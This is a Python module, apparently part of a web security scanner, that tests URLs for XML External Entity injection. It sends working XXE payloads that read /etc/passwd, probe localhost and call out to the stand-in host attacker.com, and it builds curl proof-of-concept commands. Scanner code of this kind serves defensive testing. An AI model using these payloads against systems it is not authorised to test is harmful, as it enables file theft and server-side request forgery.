"""
XXE (XML External Entity) Detection Module
OWASP A05:2021 - Security Misconfiguration
"""

import requests
from typing import List, Dict, Any
from urllib.parse import urlparse
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.payload_loader import payload_loader


class XXEModule:
    def __init__(self, target_url: str, custom_payloads: List[str] = None, http_client: Any = None):
        self.target_url = target_url
        
        # Inject custom HttpClient if provided
        if http_client:
            self.http = http_client
        else:
            import requests as r
            self.http = r
        
        # Default XXE payloads
        default_payloads = [
            # Basic XXE
            '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>''',
            
            # XXE with parameter entity
            '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<foo>test</foo>''',
            
            # XXE SSRF
            '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:80">]>
<foo>&xxe;</foo>''',
            
            # Blind XXE
            '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe">%xxe;]>
<foo>test</foo>''',
        ]
        
        self.payloads = payload_loader.merge_with_defaults(
            default_payloads,
            custom_payloads or []
        )
        
        # Detection patterns
        self.detection_patterns = [
            'root:',  # /etc/passwd
            '[extensions]',  # win.ini
            'DOCTYPE',
            'ENTITY',
        ]
        
    def test_xxe(self, url: str) -> List[Dict[str, Any]]:
        """Test for XXE vulnerabilities"""
        findings = []
        
        headers = {'Content-Type': 'application/xml'}
        
        try:
            for payload in self.payloads:
                response = self.http.post(url, data=payload, headers=headers, timeout=10)
                
                # Check for XXE indicators
                for pattern in self.detection_patterns:
                    if pattern.lower() in response.text.lower():
                        findings.append({
                            "name": "XML External Entity (XXE) Injection",
                            "vulnerability_type": "xxe",
                            "severity": "critical",
                            "owasp_category": "A05:2021",
                            "url": url,
                            "confidence": 90,
                            "technique": "XXE Injection",
                            "evidence": {
                                "payload": payload[:100],
                                "pattern_found": pattern,
                                "response_snippet": response.text[:200]
                            },
                            "poc": f"curl -X POST {url} -H 'Content-Type: application/xml' -d '{payload[:100]}...'",
                            "remediation": "Disable external entity processing in XML parser"
                        })
                        break
                        
        except Exception as e:
            print(f"Error testing XXE: {str(e)}")
            
        return findings
        
    def scan(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Scan for XXE vulnerabilities"""
        all_findings = []
        
        for url in urls:
            findings = self.test_xxe(url)
            all_findings.extend(findings)
            
        return all_findings
